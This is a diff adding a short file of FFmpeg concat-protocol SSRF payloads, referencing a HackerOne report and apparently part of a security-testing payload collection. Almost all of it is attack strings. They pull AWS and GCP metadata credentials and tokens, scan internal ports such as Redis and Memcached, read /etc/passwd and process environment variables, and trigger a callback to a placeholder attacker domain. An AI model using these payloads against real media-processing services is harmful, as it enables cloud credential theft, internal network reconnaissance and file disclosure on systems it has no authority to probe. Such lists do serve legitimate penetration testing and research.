@@ -1,0 +1,27 @@
+# FFmpeg Concat Protocol SSRF Payloads
+# =====================================
+# Reference: TikTok FFmpeg SSRF (HackerOne #1062888)
+#
+# The concat protocol can be abused to make FFmpeg
+# read from arbitrary URLs during video processing.
+
+# Basic concat SSRF
+concat:http://169.254.169.254/latest/meta-data/|file:///dev/null
+
+# AWS metadata via concat
+concat:http://169.254.169.254/latest/meta-data/iam/security-credentials/|file:///dev/null
+
+# GCP metadata via concat (requires header bypass)
+concat:http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token|file:///dev/null
+
+# Internal port scan via concat
+concat:http://127.0.0.1:8080/|file:///dev/null
+concat:http://127.0.0.1:6379/|file:///dev/null
+concat:http://127.0.0.1:11211/|file:///dev/null
+
+# File read via concat
+concat:file:///etc/passwd|file:///dev/null
+concat:file:///proc/self/environ|file:///dev/null
+
+# DNS callback
+concat:http://CALLBACK_DOMAIN/ffmpeg-concat|file:///dev/null
